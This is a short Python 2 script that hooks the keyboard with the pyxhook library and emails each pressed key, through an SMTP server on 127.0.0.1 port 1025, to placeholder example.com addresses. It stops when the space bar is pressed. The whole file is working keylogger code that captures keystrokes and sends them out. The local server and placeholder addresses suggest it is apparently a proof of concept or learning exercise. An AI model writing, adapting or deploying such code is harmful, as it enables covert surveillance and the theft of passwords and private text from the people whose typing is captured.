import smtplib
import email.utils
from email.mime.text import MIMEText

import sys
import os

sys.path.append(os.path.abspath("../pyxhook-master/")) #To allow for the pyxhook library to work

import pyxhook
import time

def kbevent (event):
    print event
    # Create the message
    msg = MIMEText(event.Key)
    msg['To'] = email.utils.formataddr(('Recipient', 'recipient@example.com'))
    msg['From'] = email.utils.formataddr(('Author', 'author@example.com'))
    msg['Subject'] = 'Input Detected!'

    server = smtplib.SMTP('127.0.0.1', 1025)
    server.set_debuglevel(True) # show communication with the server
    try:
        server.sendmail('author@example.com', ['recipient@example.com'], msg.as_string())
    finally:
        server.quit()

    if event.Ascii == 32:
        global running
        running = False

hm = pyxhook.HookManager()

hm.KeyDown = kbevent

hm.HookKeyboard()

hm.start()

running = True

while running:
    time.sleep(0.1)

hm.cancel()


